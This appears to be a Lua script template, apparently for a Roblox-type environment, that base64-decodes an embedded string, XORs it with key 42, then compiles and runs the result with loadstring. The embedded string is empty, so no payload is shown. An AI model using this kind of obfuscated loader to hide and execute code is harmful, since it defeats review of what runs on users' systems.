local b64 = "";
local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';
local function base64_decode(data)
  data = data:gsub('[^'..b..'=]', '')
  return (data:gsub('.', function(x)
    if x == '=' then return '' end
    local f = b:find(x)
    if not f then return '' end
    local r = ''
    for i = 6, 1, -1 do r = r .. ((f - 1) % 2^i - (f - 1) % 2^(i - 1) > 0 and '1' or '0') end
    return r
  end):gsub('%d%d%d%d%d%d%d%d', function(x)
    local c = 0
    for i = 1, 8 do c = c + (x:sub(i, i) == '1' and 2^(8 - i) or 0) end
    return string.char(c)
  end))
end;
local function xor(str, key)
  local res = {}
  for i = 1, #str do res[i] = string.char(bit32.bxor(str:byte(i), key)) end
  return table.concat(res)
end;
local decoded = nil
local success, result = pcall(function() decoded = xor(base64_decode(b64), 42) return loadstring(decoded) end)
if success and type(result) == 'function' then pcall(result) else warn('Erro ao carregar script') end
